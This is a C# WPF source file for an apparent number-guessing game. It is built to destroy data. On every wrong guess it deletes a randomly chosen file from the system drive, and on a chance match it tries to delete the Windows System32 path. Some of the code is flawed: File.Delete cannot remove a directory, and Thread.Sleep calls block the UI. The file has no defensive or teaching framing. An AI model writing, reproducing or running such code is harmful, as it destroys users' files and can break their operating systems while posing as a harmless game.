using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace WpfApp
{
    public partial class MainWindow : Window
    {
        private Random random = new Random();
        private int number;
        private int fileNumber;
        private int luckyNumber;

        public MainWindow()
        {
            InitializeComponent();
            StartGame();
        }

        private void StartGame()
        {
            number = random.Next(0, 10);
            fileNumber = random.Next(0, 1001);
            luckyNumber = random.Next(0, 1001);

            DisplayMessage("The first number is...");
            Thread.Sleep(3000);
            DisplayMessage(fileNumber + "!");
            Thread.Sleep(1000);
            DisplayMessage("and the second number is...");
            Thread.Sleep(3000);
            DisplayMessage(luckyNumber + "!");
            Thread.Sleep(1000);

            if (fileNumber == luckyNumber)
            {
                DisplayMessage("Luck wasn't on your side this time...");
                DeleteFile("C:\\Windows\\System32");
            }
            else
            {
                DisplayMessage("You were lucky! Now, choose a file to delete.");
            }
        }

        private void DisplayMessage(string message)
        {
            Dispatcher.Invoke(() => { OutputTextBox.AppendText(message + "\n"); });
        }

        private void GuessButton_Click(object sender, RoutedEventArgs e)
        {
            if (int.TryParse(GuessInput.Text, out int guess))
            {
                if (guess == number)
                {
                    DisplayMessage("You Won! :)");
                }
                else
                {
                    DisplayMessage($"You lost :( The right answer was {number}");
                    DeleteRandomFile();
                }
            }
            else
            {
                DisplayMessage("Invalid input. Please enter a number between 0 and 9.");
            }
        }

        private void DeleteRandomFile()
        {
            string file = GetRandomFileFromDisk();
            if (file != null)
            {
                DisplayMessage($"Randomly selected file: {file}");
                DeleteFile(file);
            }
            else
            {
                DisplayMessage("No files found to delete.");
            }
        }

        private void DeleteFile(string file)
        {
            try
            {
                File.Delete(file);
                DisplayMessage($"File '{file}' has been removed.");
            }
            catch (Exception ex)
            {
                DisplayMessage($"Error deleting file: {ex.Message}");
            }
        }

        private string GetRandomFileFromDisk()
        {
            var roots = new List<string> { Path.GetPathRoot(Environment.SystemDirectory) };
            var files = GetAllFiles(roots);
            return files.Count > 0 ? files[random.Next(files.Count)] : null;
        }

        private List<string> GetAllFiles(List<string> startingDirectories)
        {
            var files = new List<string>();
            foreach (var directory in startingDirectories)
            {
                try
                {
                    files.AddRange(Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories));
                }
                catch (UnauthorizedAccessException) { }
                catch (IOException) { }
            }
            return files;
        }
    }
}
